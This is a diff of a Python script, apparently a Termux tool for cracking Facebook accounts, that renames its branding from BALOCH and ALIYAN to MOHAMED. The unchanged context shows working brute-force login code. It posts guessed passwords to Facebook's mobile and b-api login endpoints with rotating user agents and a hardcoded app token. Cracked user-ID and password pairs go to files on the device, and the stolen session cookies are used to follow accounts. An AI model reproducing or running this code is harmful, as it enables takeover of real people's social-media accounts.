@@ -83,9 +83,9 @@ imt="-M4786=="
 ak=" MOHAMED -"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.mrMOHAMED -cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.mrMOHAMED -cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -300,7 +300,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ BALOCH ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ MOHAMED ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -315,14 +315,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ BALOCH-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ MOHAMED -CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ MOHAMED -OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -353,17 +353,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ BALOCH-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ MOHAMED-Cp ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ MOHAMED-Ok ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BALOCH-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/MOHAMED-Ok.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -417,13 +417,13 @@ class Main:
 		print("\033[1;32m [1] First You Subscribe Channel")
 		print("\033[1;33m [2] Exit")
 		print("")
-		ALIYAN = input("\n\033[1;36m  Chose ==> \033[1;32m")
-		if ALIYAN in ["", " "]:
+		MOHAMED = input("\n\033[1;36m  Chose ==> \033[1;32m")
+		if MOHAMED in ["", " "]:
 			exit()
-		elif ALIYAN in ["2", "02"]:
+		elif MOHAMED in ["2", "02"]:
 			print("    Thanks🥰♥️")
 			exit()
-		elif ALIYAN in ["1", "01"]:
+		elif MOHAMED in ["1", "01"]:
 			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
 			print("")
 			time.sleep(2.0)
@@ -855,7 +855,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ BALOCH ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ MOHAMED ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -872,15 +872,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ BALOCH-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ MOHAMED-Ok ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-MOHAMED -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ MOHAMED-Ok ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-MOHAMED-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1299,15 +1299,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ MOHAMED -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-MOHAMED-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ MOHAMED-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-MOHAMED -OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1316,7 +1316,7 @@ class Main:
 
 
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.mrMOHAMED -cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://github.com/bmohamedamin/trick/blob/main/trick.txt").text
